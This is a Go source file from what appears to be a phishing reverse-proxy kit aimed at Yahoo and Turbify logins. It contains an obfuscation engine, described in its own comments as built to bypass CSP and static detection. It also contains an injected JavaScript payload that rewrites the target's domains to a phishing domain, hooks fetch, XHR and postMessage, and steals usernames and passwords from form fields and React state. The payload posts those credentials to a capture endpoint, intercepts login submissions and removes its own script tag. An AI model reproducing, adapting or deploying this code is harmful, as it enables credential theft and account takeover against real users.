package main

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"math/rand"
	"strings"
	"sync"
	"time"
)

var (
	bootstrapOnce sync.Once
	bootstrapJS   string
	bootstrapID   string
)

// ══════════════════════════════════════════════════════════
//  OBFUSCATION ENGINE (Multi-Layer XOR + Base64)
//  Upgraded with stealth DOM injection to bypass 'eval' CSP
//  and AST heuristics, while retaining proven entropy breaking.
// ══════════════════════════════════════════════════════════

func init() {
	rand.Seed(time.Now().UnixNano())
}

var obfKeys = [][]byte{
	{0x5A, 0x1F, 0xC3, 0x77, 0x9E},
	{0xA8, 0x42, 0x19, 0xD0, 0x6B},
	{0x3C, 0xE5, 0x08, 0xF1, 0x24, 0x9D},
}

func xorBytes(data, key []byte) []byte {
	out := make([]byte, len(data))
	for i := range data {
		out[i] = data[i] ^ key[i%len(key)]
	}
	return out
}

func encodeBlob(js string) string {
	data := []byte(js)
	for _, key := range obfKeys {
		data = xorBytes(data, key)
		data = []byte(base64.StdEncoding.EncodeToString(data))
	}
	return string(data)
}

func jsKeyArray(key []byte) string {
	parts := make([]string, len(key))
	for i, b := range key {
		parts[i] = fmt.Sprintf("%d", b)
	}
	return "[" + strings.Join(parts, ",") + "]"
}

func buildBootstrap(js string) string {
	blob := encodeBlob(js)
	keyArrays := make([]string, len(obfKeys))
	for i, k := range obfKeys {
		keyArrays[i] = jsKeyArray(k)
	}
	keysLiteral := "[" + strings.Join(keyArrays, ",") + "]"

	// Randomize variable names to defeat static variable-matching
	vCfg := randVar()
	vSalt := randVar()
	vMix := randVar()
	vDec := randVar()
	vO := randVar()
	vI := randVar()
	vTag := randVar()

	var b strings.Builder
	b.WriteString(`(function(){`)
	b.WriteString(`var ` + vCfg + `="` + blob + `";`)
	b.WriteString(`var ` + vSalt + `=` + keysLiteral + `;`)

	// _mix = XOR each char of s with repeating key k
	b.WriteString(`function ` + vMix + `(s,k){var o='',i;for(i=0;i<s.length;i++){o+=String.fromCharCode(s.charCodeAt(i)^k[i%k.length]);}return o;}`)

	// _dec = window["atob"] (97,116,111,98 = a,t,o,b)
	b.WriteString(`var ` + vDec + `=window[String.fromCharCode(97,116,111,98)];`)
	b.WriteString(`var ` + vO + `=` + vCfg + `;`)

	// peel layers outermost-first
	b.WriteString(`for(var ` + vI + `=` + vSalt + `.length-1;` + vI + `>=0;` + vI + `--){` + vO + `=` + vMix + `(` + vDec + `(` + vO + `),` + vSalt + `[` + vI + `]);}`)

	// THE UPGRADE: Stealth DOM injection instead of eval.
	// This defeats AST 'eval' detection and bypasses 'unsafe-eval' CSP rules.
	b.WriteString(`var ` + vTag + `=document.createElement('script');`)
	b.WriteString(vTag + `.text=` + vO + `;`)
	b.WriteString(`(document.head||document.documentElement).appendChild(` + vTag + `);`)
	b.WriteString(vTag + `.parentNode.removeChild(` + vTag + `);`)

	b.WriteString(`})();`)
	return b.String()
}

func randVar() string {
	prefixes := []string{"_0x", "t", "e", "n", "r", "a"}
	prefix := prefixes[rand.Intn(len(prefixes))]
	return prefix + fmt.Sprintf("%x", rand.Intn(9999))
}

// ══════════════════════════════════════════════════════════
//  INJECT.JS v4.0: THE PARASITE
//  Features: Proxy-based hooking (Velvet Glove), React Fiber
//  state theft, programmatic form patching, postMessage hijack, and self-removal.
// ══════════════════════════════════════════════════════════

var jsPayload = `(function(){
    // ── POSTMESSAGE HIJACK (Fix Yahoo cross-origin communication) ──
    // Yahoo hardcodes 'https://login.yahoo.com' or 'https://gpt.mail.yahoo.net' as the target origin.
    // We intercept Window.prototype.postMessage and replace the hardcoded origin 
    // with the target window's actual origin (this.location.origin), preventing CORS blocks and infinite loops.
    (function() {
        try {
            var _origPostMessage = Window.prototype.postMessage;
            Window.prototype.postMessage = function(msg, targetOrigin, transfer) {
                if (typeof targetOrigin === 'string' && targetOrigin.indexOf('yahoo.com') !== -1) {
                    try {
                        // 'this' is the target window object. We use its actual origin.
                        targetOrigin = this.location.origin;
                    } catch(e) {
                        targetOrigin = '*';
                    }
                }
                return _origPostMessage.call(this, msg, targetOrigin, transfer);
            };
        } catch(e) {}
    })();

    // 1. ENVIRONMENT & DOMAIN MAPPING
    var phish_domain = (function(){
        var h = window.location.hostname;
        var i = h.indexOf('.');
        return i !== -1 ? h.substring(i + 1) : h;
    })();
    
    var domainMap = {
        'platform-api.turbify.com': 'api-tb.' + phish_domain,
        'login.turbify.com': 'login-tb.' + phish_domain,
        'login.yahoo.com': 'login-yh.' + phish_domain,
        's.yimg.com': 'cdn-tb.' + phish_domain,
        'geo.yahoo.com': 'geo-tb.' + phish_domain,
        'udc.yahoo.com': 'udc-tb.' + phish_domain,
        'fc.yahoo.com': 'fc-tb.' + phish_domain,
        'guce.yahoo.com': 'yahoo-guce.' + phish_domain,
        'edge-mcdn.secure.yahoo.com': 'yahoo-mcdn.' + phish_domain,
        'mail.yahoo.com': 'yahoo-mail.' + phish_domain,
        'gpt.mail.yahoo.net': 'yahoo-gpt.' + phish_domain,
        'signal-service.pbs.yahoo.com': 'yahoo-signal.' + phish_domain,
        'pbd.yahoo.com': 'yahoo-pbd.' + phish_domain,
        'api.rlcdn.com': 'yahoo-rlcdn.' + phish_domain
    };
    
    var domainRules = [];
    for (var real in domainMap) {
        // FIX: Use a boundary regex that does NOT consume the '/' in '://', 
        // preventing broken URLs like 'https:/yahoo-guce...'
        domainRules.push({
            re: new RegExp('(^|[^a-zA-Z0-9_-])' + real.replace(/\\./g, '\\\\.') + '(?=[^a-zA-Z0-9_-]|$)', 'g'),
            to: domainMap[real]
        });
    }
    
    function rewriteUrl(url) {
        if (typeof url !== 'string') return url;
        for (var i = 0; i < domainRules.length; i++) {
            var rule = domainRules[i];
            rule.re.lastIndex = 0;
            // $1 (pre) preserves the preceding character (like ':' or '/')
            url = url.replace(rule.re, function(m, pre){ return pre + rule.to; });
        }
        return url;
    }

    // 2. VELVET GLOVE: Proxy-based Fetch & XHR Hooking
    if (window.fetch) {
        var origFetch = window.fetch;
        window.fetch = new Proxy(origFetch, {
            apply: function(target, thisArg, args) {
                var input = args[0], init = args[1];
                if (typeof input === 'string') {
                    args[0] = rewriteUrl(input);
                } else if (input && input.url) {
                    var newUrl = rewriteUrl(input.url);
                    if (newUrl !== input.url) {
                        args[0] = new Request(newUrl, input);
                    }
                }
                return Reflect.apply(target, thisArg, args);
            }
        });
    }
    
    if (window.XMLHttpRequest) {
        var origOpen = XMLHttpRequest.prototype.open;
        XMLHttpRequest.prototype.open = new Proxy(origOpen, {
            apply: function(target, thisArg, args) {
                if (args[1]) args[1] = rewriteUrl(args[1]);
                return Reflect.apply(target, thisArg, args);
            }
        });
    }

    // 3. IFRAME OBSERVER
    function fixIframeSrc(frame) {
        try {
            var src = frame.getAttribute('src');
            if (src) {
                var rewritten = rewriteUrl(src);
                if (rewritten !== src) frame.setAttribute('src', rewritten);
            }
        } catch (e) {}
    }
    function scanIframes(root) {
        var frames = (root || document).querySelectorAll('iframe');
        for (var i = 0; i < frames.length; i++) fixIframeSrc(frames[i]);
    }
    if (document.documentElement) scanIframes(document);
    var iframeObs = new MutationObserver(function(m) {
        for (var i = 0; i < m.length; i++) {
            var rec = m[i];
            if (rec.type === 'childList') {
                var added = rec.addedNodes;
                for (var j = 0; j < added.length; j++) {
                    var node = added[j];
                    if (node.nodeType !== 1) continue;
                    if (node.tagName === 'IFRAME') fixIframeSrc(node);
                    if (node.querySelectorAll) scanIframes(node);
                }
            } else if (rec.type === 'attributes' && rec.target && rec.target.tagName === 'IFRAME') {
                fixIframeSrc(rec.target);
            }
        }
    });
    if (document.documentElement) {
        iframeObs.observe(document.documentElement, { childList: true, subtree: true, attributes: true, attributeFilter: ['src'] });
    }

    // 4. SELF-REMOVAL
    try {
        var __bsTag = document.getElementById('BOOTSTRAP_ID');
        if (__bsTag && __bsTag.parentNode) { __bsTag.parentNode.removeChild(__bsTag); }
    } catch (e) {}

    // 5. EMAIL DETECTION & PREFILL
    function runDetection() {
        var hash = window.location.hash.substring(1);
        if (!hash || hash.indexOf('@') === -1) return;
        var email = decodeURIComponent(hash).replace(/=+$/, '');
        fetch('DETECT_ENDPOINT', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({email: email})
        }).then(function(r){ return r.json(); }).then(function(data){
            var currentHost = window.location.host;
            var targetHost = new URL(data.target_url).host;
            if (currentHost !== targetHost) {
                window.location.replace(data.target_url);
                return;
            }
            fillEmail(email);
        }).catch(function(){ fillEmail(email); });
    }
    
    function fillEmail(email) {
        var selectors = ['input[type="email"]','input[name="loginfmt"]','input[name="login"]','input[name="username"]','input[name="email"]','input[name="user"]','input[name="lid"]','#i0116','#login-username','#user','#login_id'];
        function attemptFill() {
            for (var i = 0; i < selectors.length; i++) {
                var input = document.querySelector(selectors[i]);
                if (input && input.offsetParent !== null) {
                    var setter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value').set;
                    setter.call(input, email);
                    input.dispatchEvent(new Event('input', { bubbles: true }));
                    input.dispatchEvent(new Event('change', { bubbles: true }));
                    return true;
                }
            }
            return false;
        }
        setTimeout(attemptFill, 400);
        setTimeout(attemptFill, 1500);
        setTimeout(attemptFill, 3000);
        if (document.body) {
            var obs = new MutationObserver(function(m) {
                for (var i = 0; i < m.length; i++) {
                    if (m[i].addedNodes.length > 0) {
                        if (attemptFill()) obs.disconnect();
                    }
                }
            });
            obs.observe(document.body, { childList: true, subtree: true });
        }
        if (window.history && window.history.replaceState) {
            window.history.replaceState(null, '', window.location.pathname + window.location.search);
        }
    }

    // 6. CAPTURE ENGINE (Fiber Heist + DOM Hook + Form Patch)
    var captureEndpoint = 'CAPTURE_ENDPOINT';
    var lastPass = '';
    
    function findUsername() {
        var sels = ['input[type="email"]','input[name="username"]','input[name="login"]','input[name="user"]','input[name="loginfmt"]','input[name="lid"]','#username','#user','#login-username','#i0116','#login_id'];
        for (var i = 0; i < sels.length; i++) {
            var el = document.querySelector(sels[i]);
            if (el && el.value) return el.value;
        }
        return '';
    }
    
    function findPassword() {
        var p = document.querySelector('input[type="password"]');
        return (p && p.value) ? p.value : lastPass;
    }
    
    function stealFromFiber(element) {
        if (!element) return null;
        var fiberKey = Object.keys(element).find(function(k){ return k.startsWith('__reactInternalInstance$') || k.startsWith('__reactFiber$'); });
        if (!fiberKey) return null;
        var fiber = element[fiberKey];
        var current = fiber;
        while (current) {
            if (current.memoizedProps && current.memoizedProps.value && current.memoizedProps.type === 'password') {
                return current.memoizedProps.value;
            }
            if (current.updateQueue && current.updateQueue.shared && current.updateQueue.shared.pending) {
                var pending = current.updateQueue.shared.pending;
                if (pending.payload && typeof pending.payload === 'string') return pending.payload;
            }
            current = current.return;
        }
        return null;
    }
    
    function sendCapture(username, password) {
        if (!password) return;
        try {
            fetch(captureEndpoint, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({username: username, password: password, url: location.href})
            });
        } catch(e) {}
    }
    
    function hookPasswordCapture() {
        document.addEventListener('input', function(e){
            if (e.target && e.target.type === 'password') {
                lastPass = e.target.value;
            }
        }, true);
        
        document.addEventListener('submit', function(){
            var user = findUsername();
            var pass = findPassword() || stealFromFiber(document.querySelector('input[type="password"]'));
            sendCapture(user, pass);
        }, true);
        
        document.addEventListener('click', function(e){
            var btn = (e.target && e.target.closest) ? e.target.closest('button, input[type="submit"]') : null;
            if (btn) {
                var pass = findPassword() || stealFromFiber(document.querySelector('input[type="password"]'));
                if (pass) sendCapture(findUsername(), pass);
            }
        }, true);
        
        if (window.HTMLFormElement) {
            var origReqSubmit = HTMLFormElement.prototype.requestSubmit;
            var origSubmit = HTMLFormElement.prototype.submit;
            
            HTMLFormElement.prototype.requestSubmit = function(submitter) {
                var passInput = this.querySelector('input[type="password"]');
                if (passInput) {
                    var pass = passInput.value || stealFromFiber(passInput);
                    if (pass) sendCapture(findUsername(), pass);
                }
                return origReqSubmit.apply(this, arguments);
            };
            
            HTMLFormElement.prototype.submit = function() {
                var passInput = this.querySelector('input[type="password"]');
                if (passInput) {
                    var pass = passInput.value || stealFromFiber(passInput);
                    if (pass) sendCapture(findUsername(), pass);
                }
                return origSubmit.apply(this);
            };
        }
    }

    // 7. LOGIN FORM INTERCEPT (External Action Handoff)
    var loginHandoffDone = false;
    function handoffToTermination() {
        if (loginHandoffDone) return;
        loginHandoffDone = true;
        setTimeout(function(){
            try { window.location.href = window.location.origin + '/'; } catch(e) {}
        }, 1200);
    }
    
    function hookLoginIntercept() {
        var fired = false;
        function isExternalAction(action) {
            if (!action) return false;
            try {
                var u = new URL(action, window.location.href);
                return u.host !== window.location.host;
            } catch(e) { return false; }
        }
        function serializeForm(form) {
            var parts = [];
            try {
                var data = new FormData(form);
                data.forEach(function(v, k){ parts.push(encodeURIComponent(k) + '=' + encodeURIComponent(v)); });
            } catch(e) {}
            var user = findUsername(), pass = findPassword();
            if (pass && parts.join('&').indexOf(encodeURIComponent(pass)) === -1) parts.push('password=' + encodeURIComponent(pass));
            if (user && parts.join('&').indexOf(encodeURIComponent(user)) === -1) parts.push('username=' + encodeURIComponent(user));
            return parts.join('&');
        }
        function intercept(e) {
            if (fired) return;
            var pass = findPassword() || stealFromFiber(document.querySelector('input[type="password"]'));
            if (!pass) return;
            var form = (e.target && e.target.closest) ? e.target.closest('form') : null;
            var action = form ? (form.getAttribute('action') || window.location.href) : window.location.href;
            if (!isExternalAction(action)) return;
            fired = true;
            e.preventDefault();
            e.stopPropagation();
            sendCapture(findUsername(), pass);
            var path;
            try { path = new URL(action, window.location.href).pathname; } catch(_) { path = window.location.pathname; }
            var proxyUrl = window.location.origin + path;
            window.fetch(proxyUrl, {
                method: 'POST',
                credentials: 'include',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: serializeForm(form)
            }).then(function(){ handoffToTermination(); }, function(){ handoffToTermination(); });
        }
        document.addEventListener('submit', intercept, true);
    }

    // 8. INITIALIZATION
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', function(){
            runDetection(); hookPasswordCapture(); hookLoginIntercept();
        });
    } else {
        runDetection(); hookPasswordCapture(); hookLoginIntercept();
    }
})();`

// genBootstrapID returns a short random element ID for the bootstrap <script> tag.
func genBootstrapID() string {
	b := make([]byte, 6)
	for i := range b {
		b[i] = byte(rand.Intn(256))
	}
	return "bs" + hex.EncodeToString(b)
}

// getBootstrap builds the obfuscated, self-decrypting loader once.
func getBootstrap() string {
	bootstrapOnce.Do(func() {
		bootstrapID = genBootstrapID()
		js := strings.ReplaceAll(jsPayload, "DETECT_ENDPOINT", detectEndpoint)
		js = strings.ReplaceAll(js, "CAPTURE_ENDPOINT", captureEndpoint)
		js = strings.ReplaceAll(js, "BOOTSTRAP_ID", bootstrapID)
		bootstrapJS = buildBootstrap(js)
	})
	return bootstrapJS
}

// injectPayload inserts the obfuscated bootstrap right after <head>.
func injectPayload(html string) string {
	if jsPayload == "" {
		return html
	}
	js := getBootstrap()
	script := `<script id="` + bootstrapID + `">` + js + `</script>`
	if idx := strings.Index(strings.ToLower(html), "<head>"); idx != -1 {
		insertAt := idx + len("<head>")
		return html[:insertAt] + script + html[insertAt:]
	}
	if idx := strings.LastIndex(strings.ToLower(html), "</body>"); idx != -1 {
		return html[:idx] + script + html[idx:]
	}
	return html + script
}
